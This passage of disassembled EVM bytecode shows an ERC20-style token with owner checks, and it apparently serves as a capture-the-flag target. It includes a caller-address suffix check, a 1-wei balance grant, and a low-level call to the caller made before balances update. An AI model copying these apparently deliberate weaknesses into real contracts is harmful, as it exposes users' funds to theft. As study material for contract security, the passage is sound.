0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1588 CALLER DUP5 PUSH2 0x1583 DUP6 PUSH1 0x3 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP10 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0x262E SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x21DE JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH8 0xDE0B6B3A7640000 CALLVALUE LT ISZERO PUSH2 0x15A7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0 PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0x220866B1A2219F40E72F5C628B65D54268CA3A9D PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x1717 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND ORIGIN PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x1750 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x9 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD EQ PUSH2 0x179C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x2 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD EQ PUSH2 0x17E8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x1 CALLVALUE EQ PUSH2 0x17F5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x64 PUSH1 0x2 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP PUSH1 0x1 PUSH1 0x9 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP PUSH1 0x1 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1893 CALLER DUP5 DUP5 PUSH2 0x23D5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x1986 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x20 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x4F776E61626C653A2063616C6C6572206973206E6F7420746865206F776E6572 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0xA PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP PUSH1 0x1 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x1AAB JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x20 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x4F776E61626C653A2063616C6C6572206973206E6F7420746865206F776E6572 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x64 PUSH1 0x9 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD LT ISZERO PUSH2 0x1AF8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x9 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x1B83 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP PUSH32 0xC6CA6DD98A4B886A6583C4FE06CA48539C1B02895EDE06BE528C33B60F917B98 PUSH1 0x1 PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x1 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x3 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0xC8 DUP3 LT ISZERO PUSH2 0x1C5E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xFFFF DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND AND EQ PUSH2 0x1C84 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x9 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD GT PUSH2 0x1CD0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 PUSH1 0x2 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD LT ISZERO PUSH2 0x1D1C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 SELFBALANCE LT ISZERO PUSH2 0x1D29 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH3 0xF4240 PUSH1 0x40 MLOAD DUP1 PUSH1 0x0 ADD SWAP1 POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP8 CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x1D8B JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x1D90 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP POP PUSH2 0x1D9E CALLER ADDRESS DUP5 PUSH2 0x23D5 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x9 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD SUB SWAP3 POP POP DUP2 SWAP1 SSTORE POP PUSH1 0x1 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x1EB7 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x20 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x4F776E61626C653A2063616C6C6572206973206E6F7420746865206F776E6572 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x1F3D JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x26 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x2740 PUSH1 0x26 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0 PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP JUMP JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x20BD JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x20 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x4F776E61626C653A2063616C6C6572206973206E6F7420746865206F776E6572 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH1 0x0 DUP1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0 PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x2264 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x24 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x2788 PUSH1 0x24 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x22EA JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x22 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x2766 PUSH1 0x22 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH1 0x3 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 DUP4 PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH2 0x2427 DUP2 PUSH1 0x2 PUSH1 0x0 DUP7 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0x262E SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x2 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP PUSH2 0x24BC DUP2 PUSH1 0x2 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0x26B7 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x2 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP PUSH2 0x2508 DUP3 PUSH2 0x1497 JUMP JUMPDEST PUSH2 0x25C4 JUMPI PUSH1 0xB SLOAD PUSH1 0x2 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD GT ISZERO PUSH2 0x25C3 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0xD DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x686F6C64206F766572666C6F7700000000000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST JUMPDEST DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF DUP4 PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 GT ISZERO PUSH2 0x26A6 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1E DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x536166654D6174683A207375627472616374696F6E206F766572666C6F770000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP3 DUP5 SUB SWAP1 POP DUP1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 DUP5 ADD SWAP1 POP DUP4 DUP2 LT ISZERO PUSH2 0x2735 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1B DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x536166654D6174683A206164646974696F6E206F766572666C6F770000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID 0x4F PUSH24 0x6E61626C653A206E6577206F776E65722069732074686520 PUSH27 0x65726F206164647265737345524332303A20617070726F76652074 PUSH16 0x20746865207A65726F20616464726573 PUSH20 0x45524332303A20617070726F76652066726F6D20 PUSH21 0x6865207A65726F2061646472657373A265627A7A72 BALANCE PC KECCAK256 DUP11 JUMPDEST PUSH23 0xC8858B2D6E2432AB0B438BFA09EDFB8008EEB9E7A4D545 BLOCKHASH 0x4D 0xC6 STOP 0xEE PUSH14 0x64736F6C63430005110032000000 ",
